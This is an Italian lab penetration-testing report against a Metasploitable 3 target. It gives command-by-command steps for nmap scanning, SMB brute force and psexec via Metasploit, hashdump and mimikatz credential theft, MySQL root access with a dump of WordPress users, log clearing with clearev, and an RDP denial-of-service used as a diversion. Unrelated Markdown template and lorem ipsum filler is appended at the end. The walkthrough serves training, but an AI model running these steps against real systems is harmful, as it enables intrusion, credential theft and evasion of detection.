# Cybersecurity Project

## Introduzione
In questo report, esamineremo un'esercitazione pratica di penetration testing in cui abbiamo condotto una serie di attacchi controllati all'interno di un ambiente di test. Abbiamo utilizzato Metasploitable 3 come macchina bersaglio e Kali Linux come macchina attaccante, entrambe configurate per operare sulla stessa rete. Questa configurazione ci ha permesso di simulare un ambiente realistico in cui un attaccante può tentare di compromettere un sistema target.
Lo scopo principale di questa simulazione è accedere al sistema target e rubare quante più credenziali possibili.
L'attacco è stato eseguito seguendo diverse fasi chiave.

## Scansione della rete
In questa fase, abbiamo eseguito una scansione degli indirizzi IP della rete utilizzando Nmap. L'obiettivo era identificare le macchine attive e raccogliere informazioni sui sistemi operativi in esecuzione e sui servizi disponibili.

Dobbiamo identificare il nostro indirizzo IP e la netmask al fine di eseguire una scansione della rete e individuare gli indirizzi IP disponibili per eventuali attacchi. Utilizzando l'indirizzo IP e la netmask, possiamo calcolare il range di indirizzi IP validi nella nostra rete locale, escludendo gli indirizzi non utilizzabili come quelli di broadcast e di rete stessa. Questo ci consente di configurare correttamente gli strumenti di scansione per eseguire una scansione mirata e precisa, concentrando le risorse sui dispositivi e servizi attivi all'interno della nostra rete locale.

### a)Identificazione dell'Indirizzo IP e della Netmask
Seguiamo questi passaggi:
+ Aprire il terminale sulla propria macchina (Kali Linux).
+ Eseguire il comando ```ifconfig``` per determinare l'indirizzo IP e la netmask della macchina.

**Risultato**: L'indirizzo IP è 10.0.2.19 e la netmask è 255.255.255.0.
**Cosiderazioni**: L'indirizzo IP 10.0.2.19 con una netmask di 255.255.255.0 significa che i primi 24 bit dell'indirizzo IP sono dedicati all'identificazione della rete, mentre gli ultimi 8 bit sono destinati agli host all'interno della rete. Utilizzando la notazione CIDR (/24), possiamo rappresentare questa rete come 10.0.2.0/24, il che indica che i primi 24 bit sono la parte di rete fissa e gli ultimi 8 bit possono variare per identificare singoli host all'interno della rete.

### b)Scansione degli Indirizzi IP nella Rete
+ Aprire il terminale sulla propria macchina (Kali Linux).
+ Digitare ```nmap 10.0.2.0/24```.

**Risultato**: Viene identificato un host attivo con l'indirizzo IP 10.0.2.4.

### c)Scansione Completa della Macchina Target
+ Aprire il terminale sulla propria macchina (Kali Linux).
+ Digitare: ```nmap -v -sS -sV -T4 -A 10.0.2.4.```
  - v: Modalità verbosa.
  - sS: (SYN stealth scan): esegue una scansione SYN stealth, che è più silenziosa e meno invasiva.
  - T4: Alta velocità di scansione.
  - A: Abilita la rilevazione del sistema operativo, versioni, script di scansione e traceroute.
  - sV (version detection): tenta di identificare la versione dei servizi in esecuzione sulle porte aperte
  
**Risultato**: La scansione fornisce dettagli sui servizi in esecuzione, le versioni, e ulteriori informazioni sul sistema operativo della macchina target.


#### Riferimenti
https://www.redhat.com/sysadmin/quick-nmap-inventory

## Exploit della porta 445
Identificata una macchina con la porta 445 aperta, abbiamo sfruttato un exploit di brute force noto per ottenere le credenziali SMB. Questo è stato realizzato attraverso un attacco di forza bruta e l'utilizzo di un dizionario per gli username e password.
Adesso andremo a creare un dizionario che utilizzeremo per i nomi utente e password. Successivamente, utilizzeremo un exploit per tentare il brute force sulla porta 445 utilizzando questo dizionario.

### a)Creazione del dizionario
Utilizziamo il comando Kali cewl per costruire un nuovo elenco di parole dal contenuto della pagina di configurazione di metasploitable3: 
Digitare nel terminare: ```cewl -d 0 -w metasploitable3.txt https://github.com/rapid7/metasploitable3/wiki/Configuration``` (l'opzione -d 0 indica che i collegamenti ipertestuali non devono essere seguiti)

### b)Esexuzione Exploit
**1)Aprire Metasploit**: Aprire il terminale e digitare il comando per avviare Metasploit:```msfconsole```.

**2)Caricare il modulo SMB Login Scanner**: Una volta aperto Metasploit, caricare il modulo per eseguire un attacco brute force sull'SMB (porta 445): ```use auxiliary/scanner/smb/smb_login```.

**3)Impostare l'host bersaglio (RHOSTS)**: Specificare l'indirizzo IP del sistema bersaglio: ```set RHOSTS 10.0.2.4```

**4)Impostare il file dei nomi utente**: Specificare il percorso del file che contiene i nomi utente: ```set USER_FILE /home/kali/metasploitable3.txt```.

**5)Impostare il file delle password**: Specificare il percorso del file che contiene le password: ```set PASS_FILE /home/kali/metasploitable3.txt.```

**6)Eseguire l'exploit**: Avviare l'attacco brute force utilizzando il comando: ```exploit```.

**RISULTATO**:
Abbiamo ottenuto delle credenziali di accesso SMB.


#### Riferimenti:
+ https://www.geeksforgeeks.org/cewl-tool-creating-custom-wordlists-tool-in-kali-linux/
+ https://www.hackingarticles.in/password-crackingsmb/


## Determinazione utenti locali Sam
 Utilizzando le credenziali SMB, abbiamo utilizzato un altro exploit per determinare gli utenti locali della macchina.
**1)Aprire Metasploit**: Aprire il terminale e digitare il comando per avviare Metasploit:```msfconsole```.

**2)Caricare il modulo SMB enumusers Scanner**: Una volta aperto Metasploit, caricare il modulo per eseguire una scansione degli utenti locali Sam: ```auxiliary/scanner/smb/smb_enumusers```.

**3)Impostare l'host bersaglio (RHOSTS)**: Specificare l'indirizzo IP del sistema bersaglio: ```set RHOSTS 10.0.2.4```

**4)Impostare il nome utente**:```set SMBUser vagrant``` .

**5)Impostare la password**: ```set SMBPass vagrant```.

**6)Eseguire l'exploit**: Avviare l'attacco brute force utilizzando il comando: ```exploit```.

#### RISULTATO
Abbiamo ottenuto gli utenti locali SAM che possiamo salvare in un file *user.txt*.

#### CONSIDERAZIONI
Noto che nel file che ho salvato ci sono alcuni utenti presenti anche nelle credenziali SMB.
Potrei provare un exploit usando le stesse credenziali usate per SMB.

#### Riferimenti:
https://www.hackingarticles.in/smb-penetration-testing-port-445/

## Esecuzione di Comandi da Remoto
Utilizzando le credenziali ottenute, abbiamo sfruttato un altro exploit per eseguire comandi da remoto e aprire una sessione Meterpreter, un potente payload di Metasploit che ci ha fornito accesso remoto al sistema.


**1)Aprire Metasploit**: Aprire il terminale e digitare il comando per avviare Metasploit:```msfconsole```.

**2)Caricare il modulo SMB enumusers Scanner**: Una volta aperto Metasploit, caricare il modulo: ```exploit/windows/smb/psexec```.

**3)Impostare l'host bersaglio (RHOSTS)**: Specificare l'indirizzo IP del sistema bersaglio: ```set RHOSTS 10.0.2.4```

**4)Impostare il nome utente**:```set SMBUser vagrant``` .

**5)Impostare la password**: ```set SMBPass vagrant```.

**6)Eseguire l'exploit**: Avviare l'attacco brute force utilizzando il comando: ```exploit```.

#### RISULTATO
Abbiamo ottenuto una sessione meterpeter sulla macchina.

## Rubare le credenziali SAM
Una volta ottenuto l'accesso, abbiamo utilizzato l'estensione hashdump di Meterpreter per rubare gli hash delle password locali del sistema.
Digitare  ```hashdump``` e salvare le password su file credenzialiSAM.txt.

#### Considerazioni
Posso conservare queste password per tentare un attacco di forza bruta offline e scoprire le password in chiaro di ogni utente, per eventualmente tentare un movimento laterale o accedere a qualche sito web. Posso anche conservare queste credenziali per tentare un pass the hash.

## Utilizzo di Kiwi (mimikatz)
 Successivamente, abbiamo impiegato Mimikatz, uno strumento avanzato di post-exploitation, per estrarre ulteriori dati sensibili e credenziali dalla memoria del sistema compromesso.

**1)Aprire Mimikatz**: Digitare ```load kiwi``` nella sessione meterpeter.

**2)Elencare processi**: Digitare ```ps``` nella sessione meterpeter per visualizzare tutti i processi attivi e sceglierne uno con i giusti privilegi.

**3)Spostarsi nel processo**: Digitare ```migrate 'pid scelto'``` nella sessione meterpeter. (es scegliamo il pid del processo lssa).

**4)Rubare le credenziali**: Digitare ```creds_all``` nella sessione meterpeter per ottenere tutte le credenziali disponibili.

#### Osservazine
Per qualche motivo eseguendo meterpeter su *powershell.exe* kiwi ovvero mimikatz non funziona (osservando i processi la cosa che cambia e l'archittetura).

#### Considerazioni
Abbiamo ottenuto delle credenziali valide per il l'utente sshd_server con lo stesso dominio dell' utente Administrator.

## Accesso MySql
Abbiamo cercato di accedere al server MySQL per rubare ulteriori credenziali eseguendo un brute force con il dizionario utilizzato in precedenza.
Nella prima fase di scansione della rete, abbiamo rilevato che sulla porta 3306 è in esecuzione un database MySQL. Poiché il nostro obiettivo è ottenere il maggior numero possibile di credenziali, abbiamo deciso di prenderlo di mira.
Questa volta invece di utilizzare metasploit proviamo a utilizzare gli script NSE di nmap per verificare se è presente qualche vulnerabilità o impostazione di default.

Eseguiamo ```nmap --script all -p3306 10.0.2.4```.

RISULTATO: Dopo l' esecuzione dello script, si può vedere che è presente l' account di default *root* senza password.

A questo punto seguiamo questa procedura per scaricare le credenziali disponibli dal database:

**1)** Per accedere a mysql da remoto digitare  ```mysql -h 10.0.2.4 -u root ```.

**2)** Digitare ```SHOW DATABASE``` per vedere i database disponibili.

**3)** Digitare ```USE WORDPRESS``` per selezionare il database di wordpress (potrei trovare delle credenziali).

**4)** Digitare ```SELECT * FROM wp_users` per cercare ionformazioni in questa tabella.

**5)** Salviamo le credenziali su un file nel nostro pc.


## Eliminazione tracce
Abbiamo cercato di eliminare quante più tracce possibili dell'attacco per ridurre le possibilità di rilevamento e investigazione.
**1)Eliminazione logs**: Eliminare i logs digitando il comando: ```clearev``` nella sessione meterpreter.

## Attacco DOS
Infine, abbiamo eseguito un attacco DoS (Denial of Service) dopo aver rubato le credenziali. Questo è stato fatto per sviare l'attenzione del difensore dall'attacco effettivo, concentrando le sue risorse su questo evento.

**1)Aprire Metasploit**: Aprire il terminale e digitare il comando per avviare Metasploit:```msfconsole```.

**2)Caricare il modulo**: Una volta aperto Metasploit, caricare il modulo ```auxiliary/scanner/rdp/ms12_020_check``` per vedere se la macchina è vulnerabile a questo attacco.

**3)Impostare l'host bersaglio (RHOSTS)**: Specificare l'indirizzo IP del sistema bersaglio: ```set RHOSTS 10.0.2.4```

**4)Lanciare il modulo**: eseguire ```run``` .

Se il la macchina è vulnerabile proseguire.

**5)Caricare il modulo bluekeep**: Una volta aperto Metasploit, caricare il modulo ```dos/windows/rdp/ms12_020_maxchannelids```.

**6)Impostare l'host bersaglio (RHOSTS)**: Specificare l'indirizzo IP del sistema bersaglio: ```set RHOSTS 10.0.2.4```

**4)Lanciare il modulo**: eseguire ```run``` .

##### Riferimenti:
https://tremblinguterus.blogspot.com/2020/11/metasploitable-3-windows-walkthrough_88.html?m=1



## Images
Images have a similar syntax to links but include a preceding exclamation point.

```markdown
![Image of Minion](https://octodex.github.com/images/minion.png)
```
![Image of Minion](https://octodex.github.com/images/minion.png)

and using a local image (which also displays in GitHub):

```markdown
![Image of Octocat](images/octocat.jpg)
```
![Image of Octocat](images/octocat.jpg)

## Topic One  

Lorem markdownum in maior in corpore ingeniis: causa clivo est. Rogata Veneri terrebant habentem et oculos fornace primusque et pomaria et videri putri, levibus. Sati est novi tenens aut nitidum pars, spectabere favistis prima et capillis in candida spicis; sub tempora, aliquo.

## Topic Two

Lorem markdownum vides aram est sui istis excipis Danai elusaque manu fores.
Illa hunc primo pinum pertulit conplevit portusque pace *tacuit* sincera. Iam
tamen licentia exsulta patruelibus quam, deorum capit; vultu. Est *Philomela
qua* sanguine fremit rigidos teneri cacumina anguis hospitio incidere sceptroque
telum spectatorem at aequor.

## Topic Three

### Overview

Lorem markdownum vides aram est sui istis excipis Danai elusaque manu fores.
Illa hunc primo pinum pertulit conplevit portusque pace *tacuit* sincera. Iam
tamen licentia exsulta patruelibus quam, deorum capit; vultu. Est *Philomela
qua* sanguine fremit rigidos teneri cacumina anguis hospitio incidere sceptroque
telum spectatorem at aequor.

### Subtopic One

Lorem markdownum murmure fidissime suumque. Nivea agris, duarum longaeque Ide
rugis Bacchum patria tuus dea, sum Thyneius liquor, undique. **Nimium** nostri
vidisset fluctibus **mansit** limite rigebant; enim satis exaudi attulit tot
lanificae [indice](http://www.mozilla.org/) Tridentifer laesum. Movebo et fugit,
limenque per ferre graves causa neque credi epulasque isque celebravit pisces.

- Iasone filum nam rogat
- Effugere modo esse
- Comminus ecce nec manibus verba Persephonen taxo
- Viribus Mater
- Bello coeperunt viribus ultima fodiebant volentem spectat
- Pallae tempora

#### Fuit tela Caesareos tamen per balatum

De obstruat, cautes captare Iovem dixit gloria barba statque. Purpureum quid
puerum dolosae excute, debere prodest **ignes**, per Zanclen pedes! *Ipsa ea
tepebat*, fiunt, Actoridaeque super perterrita pulverulenta. Quem ira gemit
hastarum sucoque, idem invidet qui possim mactatur insidiosa recentis, **res
te** totumque [Capysque](http://tumblr.com/)! Modo suos, cum parvo coniuge, iam
sceleris inquit operatus, abundet **excipit has**.

In locumque *perque* infelix hospite parente adducto aequora Ismarios,
feritatis. Nomine amantem nexibus te *secum*, genitor est nervo! Putes
similisque festumque. Dira custodia nec antro inornatos nota aris, ducere nam
genero, virtus rite.

- Citius chlamydis saepe colorem paludosa territaque amoris
- Hippolytus interdum
- Ego uterque tibi canis
- Tamen arbore trepidosque

#### Colit potiora ungues plumeus de glomerari num

Conlapsa tamen innectens spes, in Tydides studio in puerili quod. Ab natis non
**est aevi** esse riget agmenque nutrit fugacis.

- Coortis vox Pylius namque herbosas tuae excedere
- Tellus terribilem saetae Echinadas arbore digna
- Erraverit lectusque teste fecerat

Suoque descenderat illi; quaeritur ingens cum periclo quondam flaventibus onus
caelum fecit bello naides ceciderunt cladis, enim. Sunt aliquis.

### Subtopic Two

Lorem *markdownum saxum et* telum revellere in victus vultus cogamque ut quoque
spectat pestiferaque siquid me molibus, mihi. Terret hinc quem Phoebus? Modo se
cunctatus sidera. Erat avidas tamen antiquam; ignes igne Pelates
[morte](http://www.youtube.com/watch?v=MghiBW3r65M) non caecaque canam Ancaeo
contingat militis concitus, ad!

#### Et omnis blanda fetum ortum levatus altoque

Totos utinamque nutricis. Lycaona cum non sine vocatur tellus campus insignia et
absumere pennas Cythereiadasque pericula meritumque Martem longius ait moras
aspiciunt fatorum. Famulumque volvitur vultu terrae ut querellas hosti deponere
et dixit est; in pondus fonte desertum. Condidit moras, Carpathius viros, tuta
metum aethera occuluit merito mente tenebrosa et videtur ut Amor et una
sonantia. Fuit quoque victa et, dum ora rapinae nec ipsa avertere lata, profugum
*hectora candidus*!

#### Et hanc

Quo sic duae oculorum indignos pater, vis non veni arma pericli! Ita illos
nitidique! Ignavo tibi in perdam, est tu precantia fuerat
[revelli](http://jaspervdj.be/).

Non Tmolus concussit propter, et setae tum, quod arida, spectata agitur, ferax,
super. Lucemque adempto, et At tulit navem blandas, et quid rex, inducere? Plebe
plus *cum ignes nondum*, fata sum arcus lustraverat tantis!

#### Adulterium tamen instantiaque puniceum et formae patitur

Sit paene [iactantem suos](http://www.metafilter.com/) turbineo Dorylas heros,
triumphos aquis pavit. Formatae res Aeolidae nomen. Nolet avum quique summa
cacumine dei malum solus.

1. Mansit post ambrosiae terras
2. Est habet formidatis grandior promissa femur nympharum
3. Maestae flumina
4. Sit more Trinacris vitasset tergo domoque
5. Anxia tota tria
6. Est quo faece nostri in fretum gurgite

Themis susurro tura collo: cunas setius *norat*, Calydon. Hyaenam terret credens
habenas communia causas vocat fugamque roganti Eleis illa ipsa id est madentis
loca: Ampyx si quis. Videri grates trifida letum talia pectus sequeretur erat
ignescere eburno e decolor terga.

> Note: Example page content from [GetGrav.org](https://learn.getgrav.org/17/content/markdown), included to demonstrate the portability of Markdown-based content
